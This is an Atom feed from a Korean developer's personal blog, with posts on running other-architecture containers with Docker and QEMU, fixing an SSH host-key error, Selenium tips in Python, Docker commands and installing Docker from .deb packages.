<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-02T15:53:21+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<pre><code class="language-mermaild!">sequenceDiagram
</code></pre>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[오직 로컬에서만 되냐 젠장]]></summary></entry><entry><title type="html">Docker + QEMU</title><link href="http://localhost:4000/ubuntu/dockerAndqemu/" rel="alternate" type="text/html" title="Docker + QEMU" /><published>2023-11-02T00:00:00+09:00</published><updated>2023-11-02T23:13:00+09:00</updated><id>http://localhost:4000/ubuntu/dockerAndqemu</id><content type="html" xml:base="http://localhost:4000/ubuntu/dockerAndqemu/"><![CDATA[<ul>
  <li>다른 아키텍처 이미지를 동작시키기 위해서는 qemu 가 필요하다.</li>
</ul>

<h2 id="docker-설치">Docker 설치</h2>

<ul>
  <li><a href="https://mingyu2.github.io/">기록하는 개발자 (mingyu2.github.io)</a></li>
</ul>

<h2 id="qemu-설치">Qemu 설치</h2>

<ul>
  <li>다른 아키텍처의 이미지 컨테이너 생성이 가능해진다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install qemu-user-static
</code></pre></div></div>

<h2 id="테스트-실행">테스트 실행</h2>

<ul>
  <li>
    <p>host 컴퓨터와 다른 아키텍처의 이미지 컨테이너를 생성 및 실행할 수 있다.</p>
  </li>
  <li>
    <p>host 컴퓨터</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ uname -a

Linux  5.15.90.1-microsoft-standard-WSL2 #1 SMP Fri Jan 27 02:56:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
</code></pre></div></div>

<ul>
  <li>arm64 아키텍처 컨테이너</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run --rm -it --platform linux/arm64 ubuntu:latest uname -a

Linux 135f72d2febe 5.15.90.1-microsoft-standard-WSL2 #1 SMP Fri Jan 27 02:56:13 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux
</code></pre></div></div>

<ul>
  <li>amd64 아키텍처 컨테이너</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run --rm -it --platform linux/amd64 ubuntu:latest uname -a

Linux 4a0c73349a8f 5.15.90.1-microsoft-standard-WSL2 #1 SMP Fri Jan 27 02:56:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
</code></pre></div></div>

<h2 id="참고사이트">참고사이트</h2>
<ul>
  <li><a href="https://www.qemu.org/download/#linux">Download QEMU - QEMU</a></li>
  <li><a href="https://docs.docker.com/build/drivers/docker-container/#qemu">Docker container build driver - Docker Docs</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="ubuntu" /><category term="docker" /><summary type="html"><![CDATA[host 아키텍처와 다른 docker 이미지를 동작시켜보자.]]></summary></entry><entry><title type="html">SSH 연결 오류(Host key verification failed.)</title><link href="http://localhost:4000/ssh/error/SSH_%EC%97%B0%EA%B2%B0_%EC%97%90%EB%9F%AC/" rel="alternate" type="text/html" title="SSH 연결 오류(Host key verification failed.)" /><published>2023-10-26T00:00:00+09:00</published><updated>2023-10-26T23:13:00+09:00</updated><id>http://localhost:4000/ssh/error/SSH_%EC%97%B0%EA%B2%B0_%EC%97%90%EB%9F%AC</id><content type="html" xml:base="http://localhost:4000/ssh/error/SSH_%EC%97%B0%EA%B2%B0_%EC%97%90%EB%9F%AC/"><![CDATA[<h2 id="ssh-오류-해결법--host-key-verification-failed-">SSH 오류 해결법 ( Host key verification failed. )</h2>

<ul>
  <li>이전에 접속한 키로 계속 접근을 시도하여 발생하는 문제이다.</li>
  <li>즉 다른 서버인데 (아이피 주소는 같음) 이전 서버의 키로 접근할려 하여 발생하는 문제이다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host key verification failed.

$ ssh-keygen -R [아이피 주소]
</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="ssh" /><category term="error" /><category term="ssh" /><summary type="html"><![CDATA[Selenium 사용할 때 유용한 정보를 정리해 보았다.]]></summary></entry><entry><title type="html">Selenium in Python 유용한 정보</title><link href="http://localhost:4000/%EA%B8%B0%EC%88%A0/SeleniumInPython/" rel="alternate" type="text/html" title="Selenium in Python 유용한 정보" /><published>2023-10-19T00:00:00+09:00</published><updated>2023-10-19T23:13:00+09:00</updated><id>http://localhost:4000/%EA%B8%B0%EC%88%A0/SeleniumInPython</id><content type="html" xml:base="http://localhost:4000/%EA%B8%B0%EC%88%A0/SeleniumInPython/"><![CDATA[<h2 id="selenium-브라우저-드라이버-경로-주기">Selenium 브라우저 드라이버 경로 주기</h2>

<ul>
  <li>브라우저 드라이버 경로를 직접 설정해 줄 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span> <span class="n">selenium.webdriver.edge.service</span> <span class="kn">import</span> <span class="n">Service</span>

<span class="n">edge_path</span> <span class="o">=</span> <span class="s">'msedgedriver.exe'</span>
<span class="n">service</span> <span class="o">=</span> <span class="nc">Service</span><span class="p">(</span><span class="n">executable_path</span><span class="o">=</span><span class="n">edge_path</span><span class="p">)</span>
<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Edge</span><span class="p">(</span><span class="n">service</span> <span class="o">=</span> <span class="n">service</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-find_element-or-find_elements">Selenium find_element or find_elements</h2>
<ul>
  <li>find_element 또는 find_elements 를 통해 원하는 element를 얻어줄 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">from</span> <span class="n">selenium</span><span class="p">.</span><span class="n">webdriver</span><span class="p">.</span><span class="n">common</span><span class="p">.</span><span class="n">by</span> <span class="n">immport</span> <span class="n">By</span>

<span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">XPATH</span><span class="p">,</span> <span class="s">'...'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="s">'ID'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">NAME</span><span class="p">,</span><span class="s">'NAME'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="s">'Class name'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">CSS_SELECTOR</span><span class="p">,</span> <span class="s">'selector'</span><span class="p">)</span>

<span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">XPATH</span><span class="p">,</span> <span class="s">'...'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="s">'ID'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">NAME</span><span class="p">,</span><span class="s">'NAME'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="s">'Class name'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">CSS_SELECTOR</span><span class="p">,</span> <span class="s">'selector'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-클릭">Selenium 클릭</h2>
<ul>
  <li>먼저 element 를 찾아주어야 한다. ( 클릭할 element 찾아주기. )</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bt</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="s">'ID'</span><span class="p">)</span>

<span class="n">bt</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">click</span><span class="p">()</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">selenium.webdriver.common.keys</span> <span class="kn">import</span> <span class="n">Keys</span>

<span class="n">bt</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="s">'ID'</span><span class="p">)</span>
<span class="n">bt</span><span class="p">.</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">Keys</span><span class="p">.</span><span class="n">ENTER</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-글-입력">Selenium 글 입력</h2>
<ul>
  <li>element (input 등) 에 사용자 입력을 넣어줄 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="s">'login_id'</span><span class="p">)</span>
<span class="n">pwd</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="s">'login_pwd'</span><span class="p">)</span>

<span class="nb">id</span><span class="p">.</span><span class="nf">send_keys</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
<span class="n">pwd</span><span class="p">.</span><span class="nf">send_keys</span><span class="p">(</span><span class="s">'password'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-프로그램-끝나도-자동-종료-안되게-하기">Selenium 프로그램 끝나도 자동 종료 안되게 하기</h2>

<ul>
  <li>단 selenium 을 실행시킨 터미널을 끄면 selenium 브라우저도 같이 종료되는 것을 확인할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">options</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">EdgeOptions</span><span class="p">()</span>
<span class="n">options</span><span class="p">.</span><span class="nf">add_experimental_option</span><span class="p">(</span><span class="s">"detach"</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Edge</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-alert-창-제어하기">Selenium Alert 창 제어하기</h2>

<ul>
  <li>Alert 창이 떴을 때 제어하지 않고 작업을 진행하면 UnexpectedAlertPresentException 오류가 발생한다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span><span class="p">:</span>
	<span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s">'xxx'</span><span class="p">)</span>
<span class="k">except</span> <span class="n">UnexpectedAlertPresentException</span><span class="p">:</span>
	<span class="c1"># 자동으로 alert 창이 닫긴다.
</span>	<span class="k">pass</span>

<span class="n">또는</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s">'xxx'</span><span class="p">)</span>
		<span class="k">break</span>
	<span class="k">except</span> <span class="n">UnexpectedAlertPresentException</span><span class="p">:</span>
		<span class="c1"># 자동으로 alert 창이 닫긴다.
</span>		<span class="k">pass</span>
</code></pre></div></div>

<h2 id="selenium-element-소스-코드-확인하기">Selenium element 소스 코드 확인하기</h2>

<ul>
  <li>element 의 소스 코드를 쉽게 확인해볼 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ele</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="s">'아이디'</span><span class="p">)</span>
<span class="n">ele</span><span class="p">.</span><span class="nf">get_attribute</span><span class="p">(</span><span class="s">'outerHTML'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-브라우저-크기-설정">Selenium 브라우저 크기 설정</h2>

<ul>
  <li>첫 브라우저를 열기전에 사용하면 된다. 브라우저가 열리고 나서는 크기를 조절할 수 없다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Edge</span><span class="p">()</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">set_window_size</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span><span class="mi">800</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-새창-열기-새로운-탭-열기">Selenium 새창 열기 (새로운 탭 열기)</h2>

<ul>
  <li>자바 스크립트 코드를 이용하여 새로운 창을 열 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 처음 URL 열기.
</span><span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="c1"># 새로운 창 만들기.
</span><span class="n">driver</span><span class="p">.</span><span class="nf">execute_script</span><span class="p">(</span><span class="s">"window.open('');"</span><span class="p">)</span>

<span class="c1"># 새로운 창으로 전환 및 새로운 URL 로 이동
</span><span class="n">driver</span><span class="p">.</span><span class="n">switch_to</span><span class="p">.</span><span class="nf">window</span><span class="p">(</span><span class="n">driver</span><span class="p">.</span><span class="n">window_handles</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">new_url</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>

<ul>
  <li><a href="https://stackoverflow.com/questions/70886308/webdriver-call-with-executable-path-deprecated">python - Webdriver call with executable path deprecated - Stack Overflow</a></li>
  <li><a href="https://github.com/SeleniumHQ/seleniumhq.github.io/blob/trunk//examples/python/tests/browsers/test_edge.py#L54">seleniumhq.github.io/examples/python/tests/browsers/test_edge.py at trunk · SeleniumHQ/seleniumhq.github.io</a></li>
  <li><a href="https://yukifox.tistory.com/entry/selenium%EC%97%90%EC%84%9C-Alert-%EC%A0%9C%EC%96%B4-%EB%B0%A9%EB%B2%95">저장소 :: selenium에서 Alert 제어 방법 (tistory.com)</a></li>
  <li><a href="https://www.browserstack.com/guide/get-html-source-of-web-element-in-selenium-webdriver">How to get HTML source of a Web Element in Selenium WebDriver BrowserStack</a></li>
  <li><a href="https://stackoverflow.com/questions/15397483/how-to-set-browsers-width-and-height-in-selenium-webdriver">python - How to set browser’s width and height in Selenium WebDriver? - Stack Overflow</a></li>
  <li><a href="https://www.geeksforgeeks.org/opening-and-closing-tabs-using-selenium/">Opening and Closing Tabs Using Selenium - GeeksforGeeks</a></li>
  <li><a href="https://couplewith.tistory.com/448">python Selenium - 웹페이지 Alert창 종류와 관리 (tistory.com)</a></li>
  <li><a href="https://dejavuqa.tistory.com/109">find_element By로 정리하기 (tistory.com)</a></li>
  <li><a href="https://ssamko.tistory.com/9">Selenium 으로 간단한 매크로 만들기 python (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="기술" /><category term="selenium" /><category term="python" /><summary type="html"><![CDATA[Selenium 사용할 때 유용한 정보를 정리해 보았다.]]></summary></entry><entry><title type="html">Docker 명령어 정리</title><link href="http://localhost:4000/ubuntu/docker%EB%AA%85%EB%A0%B9%EC%96%B4/" rel="alternate" type="text/html" title="Docker 명령어 정리" /><published>2023-10-06T00:00:00+09:00</published><updated>2023-10-06T23:13:00+09:00</updated><id>http://localhost:4000/ubuntu/docker%EB%AA%85%EB%A0%B9%EC%96%B4</id><content type="html" xml:base="http://localhost:4000/ubuntu/docker%EB%AA%85%EB%A0%B9%EC%96%B4/"><![CDATA[<h2 id="run">RUN</h2>
<ul>
  <li>컨테이너를 만드는 동시에 실행시킨다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run [옵션 들] [이미지 id 또는 이름] [CMD 실행할 명령어]
</code></pre></div></div>
<h3 id="옵션">옵션</h3>

<h4 id="-it"><code class="language-plaintext highlighter-rouge">-it</code></h4>
<ul>
  <li>컨테이너를 종류 안하고 명령어를 실행시킨다.</li>
  <li>계속 명령어를 입력할 수 있는 상태가 된다.</li>
  <li><code class="language-plaintext highlighter-rouge">/bin/bash</code>, <code class="language-plaintext highlighter-rouge">python</code> 등 과 같이 이용할 수 있다.</li>
  <li>
    <p>exit 명령을 써서 container 을 나가면 container 는 그대로 종료된다.</p>
  </li>
  <li>예</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -it [이미지 id] /bin/bash
</code></pre></div></div>

<ul>
  <li>컨테이너를 종료하지 않고 빠져나올 때.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctrl+p+q
</code></pre></div></div>

<h4 id="-d"><code class="language-plaintext highlighter-rouge">-d</code></h4>
<ul>
  <li>백 그라운드에서 앱을 실행시켜 준다</li>
</ul>

<h4 id="--rm"><code class="language-plaintext highlighter-rouge">--rm</code></h4>
<ul>
  <li>컨테이너가 종료되면 그대로 컨테이너를 삭제한다.</li>
</ul>

<h4 id="--name"><code class="language-plaintext highlighter-rouge">--name</code></h4>
<ul>
  <li>컨테이너에 이름을 부여해준다.</li>
  <li>이름으로 컨테이너를 크고, 끄고, 삭제할 수 있다.</li>
</ul>

<h4 id="-e"><code class="language-plaintext highlighter-rouge">-e</code></h4>
<ul>
  <li>컨테이너의 환경변수를 설정할 수 있다.</li>
</ul>

<h4 id="-p"><code class="language-plaintext highlighter-rouge">-p</code></h4>
<ul>
  <li>호스트와 컨테이너 간의 포트를 바인딩 해준다.</li>
  <li>포트포워딩이라 생각하면 편함</li>
</ul>

<h4 id="-v"><code class="language-plaintext highlighter-rouge">-v</code></h4>
<ul>
  <li>호스트와 컨테이너 간의 볼륨을 마운팅 하기 위해 사용된다.</li>
  <li>즉 호스트 컴퓨터의 특정 폴더를 컨테이터의 특정 폴더로 마운팅할 수 있다.</li>
</ul>

<h4 id="-w"><code class="language-plaintext highlighter-rouge">-w</code></h4>
<ul>
  <li>컨테이너의 작업 디렉터리를 설정해 줄 수 있다. 즉 기복 작업 폴더를 설정할 때 쓰인다.</li>
  <li>
    <p>Dockerfile 에서 설정한 <code class="language-plaintext highlighter-rouge">WORKDIR</code> 값을 덮어 씌을 수 있다.</p>
  </li>
  <li>기본 시작 폴더가 etc 인 것을 확인할 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -it --rm -w /etc ubuntu:23.10 /bin/bash
</code></pre></div></div>

<h4 id="--entrypoint"><code class="language-plaintext highlighter-rouge">--entrypoint</code></h4>
<ul>
  <li>entrypoint 값을 설정한다.</li>
  <li>Dockerfile 에서 설정한 <code class="language-plaintext highlighter-rouge">ENTRYPOINT</code> 값을 덮어씌을 수 있다.</li>
  <li>컨테이너가 생성되고 처음 실행되는 명령어를 설정할 수 있다.</li>
  <li>
    <p>주로 메인 명령어를 entrypoint 로 설정하고 cmd 로 옵션 값을 전달해 준다.</p>
  </li>
  <li>메인 명령어 <code class="language-plaintext highlighter-rouge">df</code> , 옵션 <code class="language-plaintext highlighter-rouge">-h</code></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run --rm --entrypoint df ubuntu:23.10 -h
</code></pre></div></div>

<h2 id="attach">ATTACH</h2>
<ul>
  <li>실행중인 container 에 바로 접속할 수 있다.</li>
  <li>주로 COMMAND 가 <code class="language-plaintext highlighter-rouge">/bin/bash</code> 일 때 사용한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker attach [실행중인 컨테이너 ID]
</code></pre></div></div>

<h2 id="exec">EXEC</h2>
<ul>
  <li>디버깅 하거나 단일 명령어 또는 커맨드 창에 접속하고 싶을 때 사용한다.</li>
  <li>외부에서 컨테이너에 접속할 때 사용한다.</li>
  <li>단일 명령어 사용이 가능하다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker exec [실행중인 컨테이너 ID]
</code></pre></div></div>

<h3 id="옵션-1">옵션</h3>

<h4 id="-it-1"><code class="language-plaintext highlighter-rouge">-it</code></h4>
<ul>
  <li>컨테이너를 종류 안하고 명령어를 실행시킨다.</li>
  <li>
    <p>exit 명령을 써서 container 을 나가도 종료가 container 종료가 되지 않는다.</p>
  </li>
  <li>예</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker exec -it [실행중인 컨테이너 ID] /bin/bash
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://changminzzang.tistory.com/17">Docker 4. exec 와 attach 명령어 차이 (tistory.com)</a></li>
  <li><a href="https://bluese05.tistory.com/77">Dockerfile Entrypoint 와 CMD의 올바른 사용 방법 (tistory.com)</a></li>
  <li><a href="https://www.daleseo.com/docker-run/">docker run 커맨드 사용법 Engineering Blog by Dale Seo</a></li>
  <li><a href="https://wooono.tistory.com/123">Docker Dockerfile 개념 및 작성법 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Ubuntu" /><category term="docker" /><summary type="html"><![CDATA[Docker 명령어 정리를 해보았다.]]></summary></entry><entry><title type="html">Docker 설치하기</title><link href="http://localhost:4000/ubuntu/docker%EC%84%A4%EC%B9%98/" rel="alternate" type="text/html" title="Docker 설치하기" /><published>2023-10-02T00:00:00+09:00</published><updated>2023-10-02T23:13:00+09:00</updated><id>http://localhost:4000/ubuntu/docker%EC%84%A4%EC%B9%98</id><content type="html" xml:base="http://localhost:4000/ubuntu/docker%EC%84%A4%EC%B9%98/"><![CDATA[<h2 id="설치된-docker-버전-삭제하기">설치된 Docker 버전 삭제하기</h2>

<ul>
  <li>Docker engine 을 설치하기 전, 설치된 docker 패키지들을 삭제하여야 한다.</li>
  <li>비공식 패키지들 삭제하여야 한다.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">docker.io</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-compose</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-doc</code></li>
      <li><code class="language-plaintext highlighter-rouge">podman-docker</code></li>
    </ul>
  </li>
  <li>Docker Engine 의 의존성인 <code class="language-plaintext highlighter-rouge">containerd.io</code> 와의 충돌을 피하기 위해서  <code class="language-plaintext highlighter-rouge">containerd</code>, <code class="language-plaintext highlighter-rouge">runc</code> 역시 삭제하여야 한다.</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">for pkg in docker.io docker-doc docker-compose podman-docker containerd runc;</span><span class="w"> </span><span class="k">do </span><span class="nb">sudo </span>apt-get remove <span class="nv">$pkg</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<h2 id="패키지를-이용하여-docker-설치하기">패키지를 이용하여 docker 설치하기</h2>

<ul>
  <li>apt 를 이용하여 docker 을 설치하는 것이 아닌 <code class="language-plaintext highlighter-rouge">dpkg</code> 를 사용하여 docker을 설치하는 방법을 정리하였다.</li>
  <li><code class="language-plaintext highlighter-rouge">deb</code> 파일을 다운로드 받고 설치해주면 된다. 그리고 만약 업그레이를 원한다면 새로운 파일을 다운로드 받고 설치해주면 된다. ( 삭제할 필요는 없다. )</li>
</ul>

<ol>
  <li><a href="https://download.docker.com/linux/ubuntu/dists/">Index of linux/ubuntu/dists/ (docker.com)</a> 링크로 들어간다.</li>
  <li>ubuntu 버전을 선택한다. ( 특정 버전 폴더로 이동하기 )</li>
  <li><code class="language-plaintext highlighter-rouge">pool/stable</code> 로 이동하고 현재 아키텍처를 선택한다. ( <code class="language-plaintext highlighter-rouge">amd64</code>, <code class="language-plaintext highlighter-rouge">armhf</code>, <code class="language-plaintext highlighter-rouge">arm64</code>, <code class="language-plaintext highlighter-rouge">s390x</code> )</li>
  <li>
    <p>Docker Engine 그리고 CLI, containerd, Docker Compose packages deb 파일들 다운로드를 한다.</p>

    <ul>
      <li><code class="language-plaintext highlighter-rouge">containerd.io_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-ce_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-ce-cli_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-buildx-plugin_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-compose-plugin_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">.deb</code> 패키지 설치하기.</li>
</ol>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sudo dpkg -i ./containerd.io_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-ce_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-ce-cli_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-buildx-plugin_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-compose-plugin_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb
</code></pre></div></div>

<ul>
  <li>Docker Engine 이 성공적으로 설치되어 있는지 확인하기.</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sudo service docker start
sudo docker run hello-world
</span></code></pre></div></div>

<h3 id="docker-engine-업그레이드">Docker Engine 업그레이드</h3>
<ul>
  <li>업그레이드 버전의 package 파일들을 다운로드하고 위의 과정을 반복해주면 된다.</li>
</ul>

<h2 id="우분투-architecture-확인법">우분투 Architecture 확인법</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">dpkg -s libc6 | grep Arch
</span></code></pre></div></div>

<h2 id="우분투-버전-확인법">우분투 버전 확인법</h2>
<ul>
  <li>VERSION_CODENAME 을 확인해주면 된다.</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">cat /etc/os-release
</span></code></pre></div></div>

<h2 id="wsl2-에서-docker-start-가-안될-때">WSL2 에서 Docker Start 가 안될 때</h2>

<ol>
  <li><code class="language-plaintext highlighter-rouge">sudo update-alternatives --config iptables</code></li>
  <li>“1” 번을 입력하고 엔터를 누른다. ( 즉, iptables-legacy 선택 )</li>
  <li><code class="language-plaintext highlighter-rouge">sudo service docker start</code></li>
</ol>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://docs.docker.com/engine/install/raspberry-pi-os/#install-from-a-package">Install Docker Engine on Raspberry Pi OS Docker Docs</a></li>
  <li><a href="https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/">Index of linux/ubuntu/dists/jammy/pool/stable/amd64/ (docker.com)</a></li>
  <li><a href="https://main.tistory.com/26">Ubuntu Architecture 확인 방법 (tistory.com)</a></li>
